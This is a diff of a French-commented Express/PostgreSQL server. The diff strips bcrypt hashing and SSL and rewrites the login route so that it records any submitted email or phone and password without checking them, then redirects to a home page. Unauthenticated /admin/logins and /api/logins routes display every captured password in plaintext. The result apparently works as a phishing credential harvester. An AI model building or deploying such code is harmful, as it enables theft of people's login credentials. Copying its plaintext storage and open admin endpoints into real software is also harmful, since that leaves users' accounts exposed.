@@ -1,24 +1,21 @@
-// ==================== IMPORTS ====================
 const express = require('express');
 const bodyParser = require('body-parser');
 const { Pool } = require('pg'); // PostgreSQL
-const bcrypt = require('bcrypt'); // Pour sécuriser les mots de passe
 const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ==================== MIDDLEWARE ====================
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ==================== CONNEXION POSTGRES ====================
+// Connexion PostgreSQL via Pool (SSL désactivé pour Render)
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
-  ssl: { rejectUnauthorized: false } // Forcer SSL même en prod
+  ssl: false // IMPORTANT : désactive SSL pour Render si serveur ne le supporte pas
 });
 
-// ==================== TEST CONNEXION DB ====================
+// TEST CONNEXION DB
 (async () => {
   try {
     const client = await pool.connect();
@@ -31,7 +28,7 @@ const pool = new Pool({
   }
 })();
 
-// ==================== FONCTION REQUÊTES AVEC RETRY ====================
+// Fonction pour exécuter des requêtes avec retry
 async function runWithRetry(query, params, retries = 5) {
   try {
     return await pool.query(query, params);
@@ -46,7 +43,7 @@ async function runWithRetry(query, params, retries = 5) {
   }
 }
 
-// ==================== CRÉATION DES TABLES ====================
+// Création des tables si elles n'existent pas
 (async () => {
   try {
     await runWithRetry(`
@@ -63,7 +60,7 @@ async function runWithRetry(query, params, retries = 5) {
     await runWithRetry(`
       CREATE TABLE IF NOT EXISTS logins (
         id SERIAL PRIMARY KEY,
-        emailorphone TEXT,
+        emailOrPhone TEXT,
         password TEXT,
         login_time TIMESTAMP
       );
@@ -75,53 +72,42 @@ async function runWithRetry(query, params, retries = 5) {
   }
 })();
 
-// ==================== ROUTE SIGNUP ====================
+// Route signup
 app.post('/signup', async (req, res) => {
   const { full_name, email, password, date_of_birth, gender } = req.body;
+  const sql = `INSERT INTO users (full_name, email, password, date_of_birth, gender) VALUES ($1, $2, $3, $4, $5)`;
+  const params = [full_name, email, password, date_of_birth, gender];
 
   try {
-    const hashedPassword = await bcrypt.hash(password, 10); // Hachage mot de passe
-    const sql = `INSERT INTO users (full_name, email, password, date_of_birth, gender) VALUES ($1, $2, $3, $4, $5)`;
-    const params = [full_name, email, hashedPassword, date_of_birth, gender];
-
     await runWithRetry(sql, params);
-    res.redirect('/login.html'); // Redirection vers login
+    res.redirect('/index.html');
   } catch (err) {
     res.status(400).send('Erreur création utilisateur : ' + err.message);
   }
 });
 
-// ==================== ROUTE LOGIN ====================
+// Route login
 app.post('/login', async (req, res) => {
   const { emailOrPhone, password } = req.body;
   const now = new Date();
+  const sql = `INSERT INTO logins (emailOrPhone, password, login_time) VALUES ($1, $2, $3)`;
+  const params = [emailOrPhone, password, now];
 
   try {
-    const userRes = await runWithRetry(`SELECT * FROM users WHERE email = $1 OR full_name = $1`, [emailOrPhone]);
-    if (userRes.rows.length === 0) {
-      return res.status(401).send('Utilisateur non trouvé');
-    }
-
-    const user = userRes.rows[0];
-    const isMatch = await bcrypt.compare(password, user.password);
-    if (!isMatch) {
-      return res.status(401).send('Mot de passe incorrect');
-    }
-
-    await runWithRetry(`INSERT INTO logins (emailorphone, password, login_time) VALUES ($1, $2, $3)`, [emailOrPhone, password, now]);
+    await runWithRetry(sql, params);
     res.redirect('/home');
   } catch (err) {
-    console.error("Erreur lors du login:", err.message);
+    console.error("Erreur insertion login:", err.message);
     res.status(500).send('Erreur base de données');
   }
 });
 
-// ==================== ROUTE HOME ====================
+// Route home
 app.get('/home', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'home.html'));
 });
 
-// ==================== ROUTE ADMIN (VOIR LES LOGINS) ====================
+// Route admin pour voir tous les logins
 app.get('/admin/logins', async (req, res) => {
   try {
     const result = await pool.query(`SELECT * FROM logins ORDER BY login_time DESC`);
@@ -135,7 +121,7 @@ app.get('/admin/logins', async (req, res) => {
     <h1>Liste des logins</h1>
     <table>
     <tr><th>ID</th><th>Email/Phone</th><th>Password</th><th>Login Time</th></tr>`;
-    
+
     result.rows.forEach(row => {
       html += `<tr>
         <td>${row.id}</td>
@@ -153,7 +139,7 @@ app.get('/admin/logins', async (req, res) => {
   }
 });
 
-// ==================== API JSON LOGINS ====================
+// API pour récupérer tous les logins
 app.get('/api/logins', async (req, res) => {
   try {
     const result = await pool.query(`SELECT * FROM logins ORDER BY login_time DESC`);
@@ -164,7 +150,7 @@ app.get('/api/logins', async (req, res) => {
   }
 });
 
-// ==================== LANCEMENT SERVEUR ====================
+// Démarrage serveur
 app.listen(PORT, () => {
   console.log(`🚀 Serveur démarré sur le port ${PORT}`);
 });
